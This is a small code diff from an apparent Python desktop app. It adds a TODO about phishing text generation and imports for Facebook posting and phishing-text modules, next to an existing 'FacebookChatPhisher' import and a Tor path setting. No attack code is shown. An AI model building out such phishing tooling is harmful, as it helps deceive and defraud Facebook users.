@@ -2,6 +2,9 @@ from tkinter import Label, Button, Entry
 from CommonFrame import CommonFrame
 from config import pathToTorInstallation
 from FacebookChatPhisher import *
+# TODO: add posting and phishing text generation 
+from FacebookPost import post
+import phishingTextGenerator 
 
 class FacebookPrivatePage(CommonFrame):
 
